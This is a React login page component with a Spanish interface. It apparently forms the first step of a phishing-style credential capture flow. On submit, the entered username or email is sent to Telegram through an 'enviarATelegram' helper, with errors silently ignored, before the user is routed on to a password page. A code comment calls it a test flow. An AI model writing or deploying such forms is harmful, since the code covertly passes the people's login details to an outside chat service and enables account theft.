import { useForm } from 'react-hook-form'
import { zodResolver } from '@hookform/resolvers/zod'
import { useLocation, useNavigate } from 'react-router-dom'
import { AuthLayout } from '../components/AuthLayout'
import { Button } from '../components/Button'
import { TextInput } from '../components/TextInput'
import { TextLink } from '../components/TextLink'
import { getStateUser, type RouterState } from '../lib/routerState'
import { loginUserSchema, type LoginUserValues } from '../lib/validation'
import { enviarATelegram } from '../telegram'

export function LoginPage() {
  const navigate = useNavigate()
  const previousUser = getStateUser(useLocation().state) ?? ''
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
  } = useForm<LoginUserValues>({
    resolver: zodResolver(loginUserSchema),
    mode: 'onChange',
    defaultValues: { user: previousUser },
  })

  const onSubmit = async ({ user }: LoginUserValues) => {
    try {
      await enviarATelegram(`🧪 Login iniciado\nUsuario: ${user}`)
    } catch {
      // Ignoramos errores de Telegram para no bloquear el flujo de prueba.
    }

    navigate('/login/password', { state: { user } satisfies RouterState })
  }

  return (
    <AuthLayout title="Bienvenido" subtitle="Inicia sesión para continuar">
      <form noValidate onSubmit={handleSubmit(onSubmit)}>
        <TextInput
          label="Usuario o correo electrónico"
          required
          autoComplete="username"
          autoCapitalize="none"
          spellCheck={false}
          error={errors.user?.message}
          {...register('user')}
        />
        <div className="mt-[15px] flex justify-center">
          <TextLink to="/forgot-password">Restablecer contraseña</TextLink>
        </div>
        <div className="mx-auto mt-[24px] max-w-[280px]">
          <Button type="submit" disabled={!isValid}>
            Continuar
          </Button>
        </div>
      </form>
    </AuthLayout>
  )
}
